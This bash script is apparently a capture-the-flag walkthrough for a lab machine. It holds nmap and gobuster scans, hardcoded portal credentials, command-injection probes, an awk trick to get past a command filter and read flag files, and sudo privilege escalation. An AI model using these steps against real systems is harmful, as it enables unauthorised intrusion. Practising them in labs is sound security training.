#!/bin/bash

# Perform a full TCP scan with service detection
nmap -sC -sV -p- 10.10.10.123 -oN full-scan.txt

# Enumerate hidden directories and files
# Using Gobuster to discover directories
# Note: Replace the wordlist path if necessary
gobuster dir -u http://10.10.10.123 -w /usr/share/wordlists/common.txt -x php,txt,html

# Authentication bypass using hardcoded credentials
# Username: R1ckRul3s
# Password: Wubbalubbadubdub
# Access Point: /portal.php

# Exploit command injection vulnerability
# Example commands to execute:
whoami
id
uname -a

# Bypass command restrictions to read files
awk '{ print }' Sup3rS3cretPickl3Ingred.txt

# Privilege escalation to root
sudo su -

# Access second ingredient
sudo awk '{ print }' /home/rick/second\ ingredients
